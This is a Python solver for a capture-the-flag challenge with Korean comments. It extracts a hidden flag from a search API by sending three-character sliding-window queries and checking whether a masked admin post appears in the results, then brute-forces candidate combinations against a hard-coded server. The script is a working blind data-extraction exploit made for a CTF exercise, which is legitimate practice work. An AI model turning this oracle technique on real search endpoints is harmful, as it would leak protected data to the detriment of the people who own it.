import requests
import string
import itertools
import json

HOST = "http://34.134.162.213:17000"
URI = "/api/search"

FLAG_HEAD = "L3AK"

def check_query(query, debug=False):
    """API에 쿼리를 보내고 결과를 확인"""
    data = {"query": query}
    
    if debug:
        print(f"Request URL: {HOST + URI}")
        print(f"Request data: {data}")
    
    try:
        # POST 요청 시도
        response = requests.post(HOST + URI, json=data, timeout=10)
        
        if debug:
            print(f"Response status: {response.status_code}")
            print(f"Response headers: {dict(response.headers)}")
            print(f"Response text: {response.text}")
        
        if response.status_code == 200:
            try:
                result = response.json()
                if debug:
                    print(f"JSON response: {json.dumps(result, indent=2)}")
                
                # 결과에서 id가 3인 항목이 포함되어 있는지 확인
                if "results" in result:
                    for item in result["results"]:
                        if (item.get("id") == 3 and 
                            item.get("title") == "Not the flag?" and 
                            item.get("author") == "admin" and
                            "************************" in item.get("content", "")):
                            return True
                
                return False
            except json.JSONDecodeError as e:
                if debug:
                    print(f"JSON decode error: {e}")
                return False
        else:
            if debug:
                print(f"HTTP error: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        if debug:
            print(f"Request error: {e}")
        return False

def find_possible_chars_at_position(current_flag, pos):
    """특정 위치에서 가능한 모든 문자를 찾음"""
    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-!@#$%^&*()="
    possible_chars = []
    
    print(f"Position {pos + 1}: Finding all possible characters...")
    
    for char in charset:
        test_flag = current_flag + char
        
        # 슬라이딩 윈도우: 마지막 3글자를 쿼리로 사용
        if len(test_flag) >= 3:
            query = test_flag[-3:]
        else:
            query = test_flag.ljust(3, 'X')
        
        print(f"Testing: {test_flag} (query: {query})", end=" ")
        
        if check_query(query):
            print("✓ FOUND!")
            possible_chars.append(char)
        else:
            print("✗")
    
    print(f"Possible characters at position {pos + 1}: {possible_chars}")
    return possible_chars

def brute_force_all_combinations():
    """각 자리별로 가능한 모든 문자를 찾아서 조합 생성"""
    known_start = "L3AK{"
    current_flag = known_start
    
    print(f"Starting from known prefix: {known_start}")
    print(f"Target flag format: L3AK{{18_characters}} (total 24 chars)")
    
    # 각 위치별로 가능한 문자들을 저장
    possible_chars_by_position = []
    
    # L3AK{에서 시작하므로 19글자 더 찾아야 함 (24 - 5 = 19)
    for pos in range(19):
        possible_chars = find_possible_chars_at_position(current_flag, pos)
        
        if not possible_chars:
            print(f"No possible characters at position {pos + 1}")
            break
        
        possible_chars_by_position.append(possible_chars)
        
        # 첫 번째 문자로 임시 확장 (다음 위치 탐색을 위해)
        current_flag += possible_chars[0]
        
        print(f"Current working flag: {current_flag}")
        print(f"Possible chars collected so far: {possible_chars_by_position}")
        print("-" * 60)
    
    # 모든 조합 생성 및 테스트
    print(f"\nGenerating all combinations...")
    print(f"Total positions found: {len(possible_chars_by_position)}")
    
    if len(possible_chars_by_position) == 19:
        print("Generating all possible combinations...")
        
        # 모든 조합 생성
        all_combinations = list(itertools.product(*possible_chars_by_position))
        print(f"Total combinations to test: {len(all_combinations)}")
        
        # 각 조합 테스트
        for i, combo in enumerate(all_combinations):
            test_flag = known_start + ''.join(combo)
            print(f"Testing combination {i+1}/{len(all_combinations)}: {test_flag}")
            
            # 최종 검증 (마지막 3글자로)
            final_query = test_flag[-3:]
            if check_query(final_query, debug=False):
                print(f"✓ VALID FLAG FOUND: {test_flag}")
                return test_flag
        
        print("No valid combination found")
        return None
    else:
        print(f"Could not find all 19 positions. Found only {len(possible_chars_by_position)} positions.")
        return None

def quick_verify_and_start():
    """빠른 확인 후 바로 브루트포싱 시작"""
    print("=== Quick verification and start ===")
    
    # AK{ 패턴 확인 (L3AK{의 마지막 3글자)
    print("Verifying AK{ pattern...")
    if check_query("AK{"):
        print("✓ AK{ pattern confirmed! Starting exhaustive search...")
        return brute_force_all_combinations()
    else:
        print("✗ AK{ pattern failed. Cannot proceed.")
        return None

def test_connection():
    """API 연결 테스트 (3글자 쿼리 사용)"""
    print("Testing API connection with 3-character query...")
    test_query = "L3A"  # 3글자
    return check_query(test_query, debug=True)

if __name__ == "__main__":
    print("=== Flag L3ak CTF Challenge Solver (All Combinations) ===\n")
    
    # API 연결 테스트
    print("Step 1: Testing API connection...")
    if not test_connection():
        print("✗ API connection failed")
        exit(1)
    else:
        print("✓ API connection successful")
    
    print("\n" + "="*50)
    
    # 전체 조합 브루트포싱 시작
    print("Step 2: Starting exhaustive combination search...")
    
    choice = input("Start exhaustive brute force attack? (y/n): ").strip().lower()
    
    if choice == 'y':
        flag = quick_verify_and_start()
        
        if flag:
            print(f"\n🎉 Flag found: {flag}")
        else:
            print("\n❌ Flag not found")
    else:
        print("Exiting...")